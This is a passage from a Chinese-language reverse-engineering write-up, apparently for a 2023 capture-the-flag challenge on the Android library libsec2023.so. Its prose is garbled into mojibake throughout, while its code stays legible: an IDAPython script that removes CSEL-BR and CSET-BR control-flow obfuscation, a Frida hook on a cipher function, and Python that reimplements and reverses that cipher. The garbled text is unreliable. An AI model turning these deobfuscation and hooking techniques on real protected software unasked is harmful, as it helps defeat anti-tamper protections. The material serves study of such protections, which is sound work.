ä¹‹åè¦æ‰§è¡Œçš„æŒ‡ä»¤å—ï¼Ÿ é‚£ç»“æœæ˜¾è€Œæ˜“è§äº†ï¼Œè¿™ BR å¯„å­˜å™¨è·³è½¬çš„å‰èº«è‚¯å®šå°±æ˜¯æ¡ä»¶è·³è½¬ï¼Œ BGE , BLE è¿™ç±»çš„æŒ‡ä»¤ libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba74 x12æ¥ä¸‹æ¥å°±æ˜¯åœ¨ IDA é‡Œé¢ä¿®å¤æ§åˆ¶æµå’¯ï¼Œæˆ‘ä»¬ä¿®å¤ä¸€ä¸‹ 0x3ba00 è¿™ä¸ªç¬¬ä¸€ä¸ª BR è·³è½¬çš„åœ°æ–¹ï¼Œåˆ«çš„åœ°æ–¹çš„æ€æƒ³éƒ½æ˜¯ä¸€æ ·çš„ libsec2023.so:0x3ba00 jump to libsec2023.so:0x3ba04 x10 è¿›å…¥åˆ° off_72C40 , åŠ ä¸Š W11 å¾—åˆ°æ­£ç¡®çš„è·³è½¬ï¼Œå†™äº†ä¸ªç®€å•çš„ python è„šæœ¬è¾“å‡º hex æ–¹ä¾¿ç›´æ¥å¤åˆ¶è¿›å» red_num = 0xFFFFFFFF8C034254add_num = 0x740078FCnum = (red_num+add_num)&amp;0xffffffffmy_byte = list(num.to_bytes(8,'little'))my_byte = [hex(x)[2::].zfill(2) for x in my_byte]print(' '.join(list(my_byte)))è¿™ä¸ªåœ°æ–¹ä¿®å¤å®Œæ˜¯è¿™æ ·çš„ï¼Œå¯ä»¥çœ‹åˆ° *(off_72C40+0) å’Œ *(off_72C40+0x28) çš„åœ°æ–¹å€¼å·²ç»è¢«æˆ‘åŠ ä¸Šå»äº† æ¥ä¸‹æ¥å°±æ˜¯æ”¹æ˜¯æ±‡ç¼–äº†ï¼ŒADD æŒ‡ä»¤æˆ‘ä»¬è‚¯å®šæ˜¯ä¸éœ€è¦äº†ï¼Œå› ä¸ºå·²ç»è¢«æˆ‘ä»¬åŠ ä¸Šå»äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç»§ç»­å¾€ä¸‹èµ°çœ‹çš„æ˜¯è¿™æ¡ CSEL X10, XZR, X9, CC æŒ‡ä»¤ å„ä¸ªæ¡ä»¶ç çš„å«ä¹‰å¦‚ä¸‹ æ¡ä»¶ç  å«ä¹‰ EQ Z ç½®ä½ï¼›ç»“æœç›¸ç­‰æ‰æ‰§è¡Œ NE Z æ¸…é›¶ï¼Œç»“æœä¸ç›¸ç­‰æ‰æ‰§è¡Œ CS C ç½®ä½ï¼Œç»“æœæ— ç¬¦å· &gt;= æ‰æ‰§è¡Œ CC C æ¸…é›¶ï¼Œç»“æœæ— ç¬¦å· &lt; æ‰æ‰§è¡Œ MI N ç½®ä½ï¼Œç»“æœä¸ºè´Ÿæ•°æ‰æ‰§è¡Œ PL N æ¸…é›¶ï¼Œç»“æœä¸ºæ­£æ•°æˆ– 0 æ‰æ‰§è¡Œ VS V ç½®ä½ï¼Œç»“æœæº¢å‡ºæ‰æ‰§è¡Œ VC V æ¸…é›¶ï¼Œç»“æœæ— æº¢å‡ºæ‰æ‰§è¡Œ HI C ç½®ä½ Z æ¸…é›¶ï¼Œç»“æœä¸ºæ— ç¬¦å·æ•°å¤§äºæ‰æ‰§è¡Œ LS C æ¸…é›¶ Z ç½®ä½ï¼Œç»“æœä¸ºæ— ç¬¦å·æ•°å°äºæˆ–ç­‰äºæ‰æ‰§è¡Œ GE N ç­‰äº Vï¼Œç»“æœä¸ºæœ‰ç¬¦å·æ•°å¤§äºæˆ–ç­‰äºæ‰æ‰§è¡Œ LT N ä¸ç­‰äº Vï¼Œç»“æœä¸ºæœ‰ç¬¦å·æ•°å°äºæ‰æ‰§è¡Œ GT Z æ¸…é›¶ä¸” N ç­‰äº V ï¼Œç»“æœä¸ºæœ‰ç¬¦å·å¤§äºæ‰æ‰§è¡Œ LE Z ç½®ä½æˆ– N ä¸ç­‰äº V ï¼Œç»“æœä¸ºæœ‰ç¬¦å·æ•°å°äºæˆ–ç­‰äº AL æ— æ¡ä»¶æ‰§è¡Œã€‚çœç•¥ã€‚ é‚£ä¹ˆè¿™é‡Œ BR åˆ†æ”¯è·³è½¬çš„æ„æ€å°±å¯ä»¥è¡¨ç¤ºä¸º if(X8 &lt; 2)&#123;// ç”± CC æŒ‡ä»¤çš„å«ä¹‰çŸ¥é“æ˜¯å°äºæ¯”è¾ƒ B 0x3BA04// å³ç»§ç»­å‘ä¸‹æ‰§è¡Œ&#125;else if(X8 >= 2)&#123; B 0x3BB50// è·³è½¬åˆ°å…¶ä»–åœ°æ–¹&#125;æ‰€ä»¥è¿™é‡Œæ”¹æˆ BGE , ç„¶åæŠŠä¸éœ€è¦çš„æŒ‡ä»¤ NOP æ‰ï¼Œä¸€å¤„åœ°æ–¹å°±ä¿®å¤å¥½å•¦ è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œé™¤äº† CSEL-BR ç»“æ„ä¹‹å¤–ï¼Œè¿˜æœ‰ CSET-BR ç»“æ„ CSETï¼š æ¯”è¾ƒæŒ‡ä»¤ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œåˆ™å¹¶ç½® 1ï¼Œå¦åˆ™ç½® 0 ï¼Œå¦‚ï¼š cmp w8, #2 ; å°†å¯„å­˜å™¨ w8 çš„å€¼å’Œå¸¸é‡ 2 è¿›è¡Œæ¯”è¾ƒcset w8, gt ; å¦‚æœæ˜¯å¤§äº(grater than)ï¼Œåˆ™å°†å¯„å­˜å™¨ w8 çš„å€¼è®¾ç½®ä¸º 1ï¼Œå¦åˆ™è®¾ç½®ä¸º 0 å’Œ CSEL-BR ç»“æ„çš„ä¿®å¤æ€è·¯æ˜¯ç›¸ä¼¼çš„ï¼Œå¯¹äºä¸Šå›¾ ( 0x3B95C å¤„) çš„ CSET-BR ç»“æ„ï¼Œæˆ‘ä»¬ä»…éœ€å…³æ³¨è¿™å‡ è¡ŒæŒ‡ä»¤ CSET W23, NELDR X8, [X21,W23,UXTW#3]ADD X8, X8, X22BR X8å…¶ä¸­çš„ LDR X8, [X21,W23,UXTW#3] çš„å«ä¹‰å¯ä»¥ç”¨ C è¯­è¨€è¿™æ ·è¡¨ç¤º X8 = *(X21 + (W23 &lt;&lt; 3)) , UXTW#3 å³å°†æ“ä½œæ•°å·¦ç§»ä¸‰ä½çš„æ„æ€ è¿™æ ·ä¸€ä¸ªä¸€ä¸ªä¿®å¤è¿‡å»ï¼Œæœªå…ä¹Ÿå¤ªéº»çƒ¦äº†ï¼Œé‚£ç´¢æ€§å°±å†™ä¸ª idapython è„šæœ¬ä¸€é”®å»é™¤ CSEL-BR å’Œ CSET-BR ç»“æ„æ¥è§£æ”¾åŒæ‰‹å§å“ˆå“ˆ import ida_segmentimport idautilsimport idcimport ida_bytesfrom keystone import *def patch_nop(begin, end): # arm64 ä¸­çš„ NOP æŒ‡ä»¤æ˜¯ b'\\x1F\\x20\\x03\\xD5' while end > begin: ida_bytes.patch_bytes(begin, b'\\x1F\\x20\\x03\\xD5') begin = begin + 4# è·å– text æ®µçš„èµ·å§‹åœ°å€text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea# start, end = 0x3BA34, 0x3BA80# start, end = 0x37390,0x373B4# æµ‹è¯• ADRP æŒ‡ä»¤# start, end = 0x3FCE0, 0x3FD00 # æµ‹è¯• EQ æƒ…å†µ#start, end = 0x3AA90, 0x3AAA4# start, end = 0x3A078, 0x3A090# æµ‹è¯• CSET-BR å»é™¤æƒ…å†µcurrent_addr = start# print(text_seg.start_ea,text_seg.end_ea)nop_addr_array_after_finish = [] # åœ¨ CSEL/CSET-BR ç»“æ„ä¿®å¤å®Œæˆåéœ€è¦ NOP çš„æŒ‡ä»¤while current_addr &lt; end: # å¤„ç† CSEL-BR ç»“æ„ if idc.print_insn_mnem(current_addr) == \"CSEL\": CSEL_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSEL_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(9): # å‘ä¸‹æœå¯» 9 æ¡æŒ‡ä»¤ï¼Œå¯»æ‰¾æ˜¯å¦æœ‰ BR æŒ‡ä»¤ if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break if idc.print_insn_mnem(temp_addr) == \"CSEL\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # åŒ¹é…åˆ°äº† CSEL-BR ç»“æ„çš„æ±‡ç¼–ï¼Œéœ€è¦å»é™¤ # å½¢å¦‚ CSEL X11, X12, X11, GE, è·å– CSEL åçš„æ“ä½œæ•° op1~3, ä»¥åŠæ¡ä»¶ç  cond CSEL_op1 = idc.print_operand(CSEL_addr, 0) CSEL_op2 = idc.print_operand(CSEL_addr, 1) CSEL_op2_val = -1 CSEL_op3 = idc.print_operand(CSEL_addr, 2) CSEL_op3_val = -1 CSEL_cond = idc.print_operand(CSEL_addr, 3) # è¯»å–æ¡ä»¶åˆ†æ”¯è¯­å¥ CSEL ä¸­è¦èµ‹å€¼ç»™ç›®æ ‡å¯„å­˜å™¨çš„ä¸¤ä¸ªæºå¯„å­˜å™¨ä¸­å­˜å‚¨çš„å€¼ temp_addr = idc.prev_head(CSEL_addr) while (CSEL_op2_val == -1 or CSEL_op3_val == -1) and temp_addr > text_seg.start_ea: if CSEL_op2 == \"XZR\": # å¦‚æœå¯„å­˜å™¨çš„å€¼æ˜¯ XZR, è¯´æ˜è¯¥å€¼ä¸º 0 CSEL_op2_val = 0 if CSEL_op3 == \"XZR\": CSEL_op3_val = 0 if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] == CSEL_op2[ 1::] and CSEL_op2_val == -1: # å¯„å­˜å™¨ X11 å’Œ W11 æ˜¯åŒä¸€ä¸ªå¯„å­˜å™¨ CSEL_op2_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_operand(temp_addr, 0)[1::] == CSEL_op3[1::] and CSEL_op3_val == -1: CSEL_op3_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # print(CSEL_op2_val, CSEL_op3_val, hex(current_addr)) assert CSEL_op2_val != -1 and CSEL_op3_val != -1 temp_addr = BR_addr jump_array_reg = \"\" # å­˜è´®è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° jump_array_addr = -1 # è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½® add_reg = [] # åŠ åˆ°è·³è½¬è¡¨çš„å€¼æ‰€åœ¨çš„å¯„å­˜å™¨ add_val = -1 # åŠ åˆ°è·³è½¬è¡¨çš„å€¼ while temp_addr > CSEL_addr: # ä»åå¾€å‰æ‰¾ï¼Œä»¥ BR æ‰€åœ¨çš„åœ°å€å¼€å§‹ï¼ŒCSEL æ‰€åœ¨çš„åœ°å€ç»“æŸï¼ŒåŒ¹é…å¿…è¦çš„å¯„å­˜å™¨åç§°å’Œå€¼ # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": jump_array_reg = idc.print_operand(temp_addr, 1)[1:-1].split(',')[0] # è·å–å­˜å‚¨è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) temp_addr = idc.prev_head(temp_addr) # å¦‚æœåœ¨ CSEL-BR é—´çš„æŒ‡ä»¤ä¸­æ²¡æ‰¾åˆ°è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½®ï¼Œåˆ™å‘ä¸Šå¯»æ‰¾ if jump_array_addr == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP æŒ‡ä»¤ï¼Œè¿˜éœ€è¦åŠ ä¸Šå¦ä¸€éƒ¨åˆ† if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) if add_val == -1: temp_addr = CSEL_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg and idc.print_operand(temp_addr, 0)[0] == 'X': add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.prev_head(temp_addr) # è®¡ç®—å‡ºåˆ†æ”¯è·³è½¬çš„ä¸¤ä¸ªä½ç½® branch_a = (ida_bytes.get_qword(jump_array_addr + CSEL_op2_val) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + CSEL_op3_val) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT æœ‰ç¬¦å·å¤§äºç­‰äº vs æœ‰ç¬¦å·å°äº # EQ&lt;->NE ç»“æœç›¸ç­‰ vs ç»“æœä¸ç›¸ç­‰ # CC&lt;->CS æ— ç¬¦å·å°äº vs æ— ç¬¦å·å¤§äºç­‰äº # HI&lt;->LS æ— ç¬¦å·å¤§äº vs æ— ç¬¦å·å°äºç­‰äº # if CSEL_cond == \"GE\":# æ„é€  B.LT è·³è½¬ logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘ä¸å–å code = f\"B.&#123;CSEL_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘å–å code = f\"B.&#123;logic_rev[CSEL_cond]&#125; #&#123;hex(branch_b)&#125;\" #print(hex(current_addr), hex(add_val), CSEL_op2_val, CSEL_op3_val, hex(jump_array_addr), code) # ä¿®å¤ BR è·³è½¬ if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSEL-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSEL-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") # å¤„ç† CSET-BR ç»“æ„ elif idc.print_insn_mnem(current_addr) == \"CSET\": CSET_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSET_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(15): # å‘ä¸‹æœå¯» 15 æ¡æŒ‡ä»¤ï¼Œå¯»æ‰¾æ˜¯å¦æœ‰ BR æŒ‡ä»¤ if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break elif idc.print_insn_mnem(temp_addr) == \"CSEL\": break elif idc.print_insn_mnem(temp_addr) == \"RET\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # åŒ¹é…åˆ°äº† CSET-BR ç»“æ„çš„æ±‡ç¼–ï¼Œéœ€è¦å»é™¤ # å½¢å¦‚ CSET W23, NE, è·å– CSET åçš„æ“ä½œæ•° op1, ä»¥åŠæ¡ä»¶ç  cond CSET_op1 = idc.print_operand(CSET_addr, 0) CSET_op1_val = -1 CSET_cond = idc.print_operand(CSET_addr, 1) temp_addr = BR_addr jump_array_reg = \"\" # å­˜è´®è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° jump_array_addr = 0 # è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½® add_reg = [] # åŠ åˆ°è·³è½¬è¡¨çš„å€¼æ‰€åœ¨çš„å¯„å­˜å™¨ add_val = 0 # åŠ åˆ°è·³è½¬è¡¨çš„å€¼ Lshift_val = -1 while temp_addr > CSET_addr: # ä»åå¾€å‰æ‰¾ï¼Œä»¥ BR æ‰€åœ¨çš„åœ°å€å¼€å§‹ï¼ŒCSET æ‰€åœ¨çš„åœ°å€ç»“æŸï¼ŒåŒ¹é…å¿…è¦çš„å¯„å­˜å™¨åç§°å’Œå€¼ # print(hex(temp_addr),idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADD\" and idc.print_operand(temp_addr, 0) == BR_reg: add_reg.append(idc.print_operand(temp_addr, 1)[1::]) add_reg.append(idc.print_operand(temp_addr, 2)[1::]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"MOVK\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) elif idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LDR\": LDR_temp = idc.print_operand(temp_addr, 1)[1:-1].split(',') jump_array_reg = LDR_temp[0] # è·å–å­˜å‚¨è·³è½¬è¡¨çš„å¯„å­˜å™¨åç§° if len(LDR_temp) == 3: Lshift_val = int(LDR_temp[2][-1:]) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"ADRL\": jump_array_reg = idc.print_operand(temp_addr, 0) jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) elif idc.print_insn_mnem(temp_addr) == \"LSL\": if idc.print_operand(temp_addr, 0)[1::] == CSET_op1[1::]: Lshift_val = idc.get_operand_value(temp_addr, 2) temp_addr = idc.prev_head(temp_addr) # å¦‚æœåœ¨ CSET-BR é—´çš„æŒ‡ä»¤ä¸­æ²¡æ‰¾åˆ°è·³è½¬è¡¨æ‰€åœ¨çš„ä½ç½®ï¼Œåˆ™å‘ä¸Šå¯»æ‰¾ if jump_array_addr == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"ADRL\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"ADRP\": # ADRP æŒ‡ä»¤ï¼Œè¿˜éœ€è¦åŠ ä¸Šå¦ä¸€éƒ¨åˆ† if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) while temp_addr &lt; text_seg.end_ea: if idc.print_insn_mnem(temp_addr) == \"ADD\": if idc.print_operand(temp_addr, 0) == jump_array_reg: jump_array_addr += idc.get_operand_value(temp_addr, 2) nop_addr_array_temp.append(temp_addr) break temp_addr = idc.next_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(jump_array_addr),hex(add_val)) # å‘ä¸Šå¯»æ‰¾åŠ åˆ°è·³è½¬è¡¨çš„å€¼ if add_val == 0: temp_addr = CSET_addr while temp_addr > text_seg.start_ea: # print(hex(temp_addr), idc.print_insn_mnem(temp_addr)) if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val = idc.get_operand_value(temp_addr, 1) nop_addr_array_temp.append(temp_addr) break elif idc.print_insn_mnem(temp_addr) == \"MOVK\": # å½¢å¦‚ MOV W9, #0x76BC;MOVK W9, #0x4C48,LSL#16; çš„å½¢å¼ if idc.print_operand(temp_addr, 0)[1::] in add_reg: # print(hex(add_val)) add_val = (idc.get_operand_value(temp_addr, 1) &lt;&lt; 16) # print(hex(add_val)) while temp_addr > text_seg.start_ea: if idc.print_insn_mnem(temp_addr) == \"MOV\": if idc.print_operand(temp_addr, 0)[1::] in add_reg: add_val += idc.get_operand_value(temp_addr, 1) # print(hex(add_val)) break temp_addr = idc.prev_head(temp_addr) break temp_addr = idc.prev_head(temp_addr) # print(hex(current_addr)) # è®¡ç®—å‡ºåˆ†æ”¯è·³è½¬çš„ä¸¤ä¸ªä½ç½® branch_a = (ida_bytes.get_qword(jump_array_addr + (1 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff branch_b = (ida_bytes.get_qword(jump_array_addr + (0 &lt;&lt; Lshift_val)) + add_val) &amp; 0xffffffffffffffff # print(hex(branch_a), hex(branch_b)) # print(CSEL_cond,hex(current_addr)) # GE&lt;->LT æœ‰ç¬¦å·å¤§äºç­‰äº vs æœ‰ç¬¦å·å°äº # EQ&lt;->NE ç»“æœç›¸ç­‰ vs ç»“æœä¸ç›¸ç­‰ # CC&lt;->CS æ— ç¬¦å·å°äº vs æ— ç¬¦å·å¤§äºç­‰äº # HI&lt;->LS æ— ç¬¦å·å¤§äº vs æ— ç¬¦å·å°äºç­‰äº # if CSEL_cond == \"GE\":# æ„é€  B.LT è·³è½¬ logic_rev = &#123;\"GE\": \"LT\", \"LT\": \"GE\", \"EQ\": \"NE\", \"NE\": \"EQ\", \"CC\": \"CS\", \"CS\": \"CC\", \"HI\": \"LS\", \"LS\": \"HI\"&#125; ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) code = \"\" if branch_b == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘ä¸å–å code = f\"B.&#123;CSET_cond&#125; #&#123;hex(branch_a)&#125;\" elif branch_a == idc.next_head(BR_addr): # åˆ¤æ–­é€»è¾‘å–å code = f\"B.&#123;logic_rev[CSET_cond]&#125; #&#123;hex(branch_b)&#125;\" # print(hex(current_addr),add_reg,hex(add_val),CSET_op1,CSET_op1_val,jump_array_reg,hex(jump_array_addr),Lshift_val,code) # ä¿®å¤ BR è·³è½¬ if code != \"\": patch_br_byte, count = ks.asm(code, addr=BR_addr) ida_bytes.patch_bytes(BR_addr, bytes(patch_br_byte)) print(f\"fix CSET-BR at &#123;hex(BR_addr)&#125;\") nop_addr_array_after_finish.extend(nop_addr_array_temp) current_addr = idc.next_head(BR_addr) continue else: print(f\"error! unable to fix CSET-BR at &#123;hex(current_addr)&#125;,branch:&#123;hex(branch_a)&#125;, &#123;hex(branch_b)&#125;\") current_addr = idc.next_head(current_addr)for addr in nop_addr_array_after_finish: patch_nop(addr, addr + idc.get_item_size(addr))# åŠ å¯†ä¸€ åœ¨ sub_3B9D4 ä¸­ __int64 __fastcall sub_3B9D4(__int64 result)&#123; unsigned __int64 i; // x8 __int64 v2; // x10 int v3; // w11 __int64 v4; // x11 int v5; // w10 int v6; // w12 unsigned __int8 v7; // w14 int v8; // [xsp+Ch] [xbp-4h] for ( i = 0LL; i &lt; 2; ++i ) &#123; v2 = 3LL; v8 = 0; v3 = 24; do &#123; *((_BYTE *)&amp;v8 + v2) = (*(_DWORD *)(result + 4 * i) >> v3) ^ v2; --v2; v3 -= 8; &#125; while ( v2 >= 0 ); HIBYTE(v8) ^= 0x86u; BYTE2(v8) -= 94; v4 = 3LL; BYTE1(v8) ^= 0xD3u; LOBYTE(v8) = v8 - 28; *(_DWORD *)(result + 4 * i) = 0; v5 = 0; v6 = 24; do &#123; v7 = *((_BYTE *)&amp;v8 + v4) - v6; *((_BYTE *)&amp;v8 + v4--) = v7; v5 += v7 &lt;&lt; v6; *(_DWORD *)(result + 4 * i) = v5; v6 -= 8; &#125; while ( v4 >= 0 ); &#125; return result;&#125;ç¬¬ä¸€ä¸ªåŠ å¯†å‡½æ•° sub_3B9D4 å–å‡ºæ•°æ®çš„æ¯ä¸€ä½è¿›è¡ŒåŠ å¯†ï¼Œå…¶ä¸­å‡ºç°çš„ HIBYTE , BYTE2 , BYTE1 , LOBYTE å«ä¹‰å¦‚ä¸‹ï¼Œå‡è®¾æœ‰æ•°æ® a1=0x12345678 , åˆ™ ç¬¦å· å–å‡ºçš„å€¼ HIBYTE(a1) 0x12 BYTE2(a1) 0x34 BYTE1(a1) 0x56 LOBYTE(a1) 0x78 æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ frida å» hook sub_3B9D4 ä¼ å…¥çš„å€¼ä»¥åŠè¿”å›å€¼ï¼Œè§‚å¯ŸåŠ å¯†å‰åçš„å˜åŒ–ï¼Œå‡è®¾æˆ‘æ­¤å¤„åœ¨å°é”®ç›˜è¾“å…¥çš„æ•°å­—æ˜¯ 999999999999 , hex(999999999999)=0xe8d4a50fff //hook ç¬¬ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œè§‚å¯Ÿæ•°å€¼å‰åå˜åŒ–function hook_1_enc()&#123;// è·å–æ¨¡å— var module = Process.getModuleByName(\"libsec2023.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x3B9D4\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('before first enc'); console.log(hexdump(args[0],&#123; offset: 0,// ç›¸å¯¹åç§» length: 64,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125;, onLeave: function (retval) &#123; console.log(\"after first enc\") console.log(hexdump(retval,&#123; offset: 0,// ç›¸å¯¹åç§» length: 64,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125; &#125;);&#125; äºæ˜¯ç¬¬ä¸€ä¸ªç®—æ³•å¦‚ä¸‹ algorithm_1 = &#123; (0, \"enc\"): lambda x: (x - 28) &amp; 0xff, (1, \"enc\"): lambda x: x ^ 0xd3, (2, \"enc\"): lambda x: (x - 94) &amp; 0xff, (3, \"enc\"): lambda x: x ^ 0x86, (0, \"dec\"): lambda x: (x + 28) &amp; 0xff, (1, \"dec\"): lambda x: x ^ 0xd3, (2, \"dec\"): lambda x: (x + 94) &amp; 0xff, (3, \"dec\"): lambda x: x ^ 0x86&#125;def enc_1(input): input_byte = bytearray(input.to_bytes(8, 'little')) for i in range(len(input_byte)): index = i % 4 input_byte[i] = (algorithm_1[(index, \"enc\")](input_byte[i] ^ index) - 8 * index) &amp; 0xff return int.from_bytes(input_byte, 'little')def dec_1(input): input_byte = bytearray(input.to_bytes(8, 'little')) for i in range(len(input_byte)): index = i % 4 input_byte[i] = (algorithm_1[(index, \"dec\")]((input_byte[i] + 8 * index) &amp; 0xff)) ^ index return int.from_bytes(input_byte, 'little')def mytest_1(): input = 999999999999 # å‡è®¾åœ¨å°é”®ç›˜è¾“å…¥ 999999999999 # éªŒè¯åŠ å¯†ç®—æ³• input = enc_1(input) assert input.to_bytes(8, 'little') == b'\\xe3\\xd5\\x39\\x39\\xcc\\xca\\x94\\x6d' # éªŒè¯è§£å¯†ç®—æ³• input = dec_1(input) assert input.to_bytes(8, 'little') == b'\\xff\\x0f\\xa5\\xd4\\xe8\\x00\\x00\\x00'mytest_1()# åœ¨ sub_3B9D4 ä¹‹å bswap32 åˆ†æ åœ¨å¯¹è¾“å…¥çš„å€¼è¿›è¡Œé¦–è½®åŠ å¯†ä¹‹åï¼Œåˆå†æ¬¡å¯¹è¾“å…¥å€¼ç»è¿‡ bswap32 å‡½æ•°åŠ å¯† è¿™ä¸ªå‡½æ•°å¯¹åº”çš„ arm æ±‡ç¼–ä¸º REV W8, W8é‚£æˆ‘ä»¬å» arm æ‰‹å†Œçœ‹çœ‹ REV æŒ‡ä»¤çš„å®šä¹‰å¥½äº† REV Byte-Reverse Word reverses the byte order in a 32-bit register. Operation if ConditionPassed() then EncodingSpecificOperations(); bits(32) result; result&lt;31:24> = R[m]&lt;7:0>; result&lt;23:16> = R[m]&lt;15:8>; result&lt;15:8> = R[m]&lt;23:16>; result&lt;7:0> = R[m]&lt;31:24>; R[d] = result; çœ‹ Operation å¾ˆæ¸…æ¥šçš„çŸ¥é“è¿™å°±æ˜¯åè½¬å­—èŠ‚ï¼Œæ¯”å¦‚ w8 = 0x12345678;REV W8, W8;w8;//w8 = 